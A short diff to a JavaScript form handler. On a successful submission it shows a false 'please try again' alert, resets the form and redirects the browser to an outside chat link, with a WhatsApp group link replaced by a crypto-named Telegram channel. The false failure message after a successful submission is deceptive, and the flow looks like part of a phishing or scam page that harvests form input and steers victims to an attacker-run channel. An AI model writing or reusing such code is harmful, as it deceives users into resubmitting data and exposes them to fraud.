@@ -67,7 +67,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (response.ok) {
           alert("⛔ please try again");
           form.reset();
-          window.location.href = "https://chat.whatsapp.com/FtVKgE6MS3RFVrFbXFIiM7";
+          window.location.href = "https://t.me/crypyopto";
         } else {
           const errorText = await response.text();
           console.error("Server Error:", errorText);
